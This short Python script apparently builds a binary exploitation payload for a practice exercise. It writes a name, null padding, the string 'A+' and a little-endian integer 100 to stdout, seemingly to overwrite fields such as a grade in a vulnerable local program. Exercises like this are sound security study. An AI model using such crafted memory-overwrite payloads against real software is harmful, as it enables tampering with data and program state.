import sys

payload = b"Andres"
payload += b"\x00" * 4
payload += b"A+"
payload += b"\x00" * 3
payload += 0x0064.to_bytes(4, "little")

payload += b"\x00"

sys.stdout.buffer.write(payload)
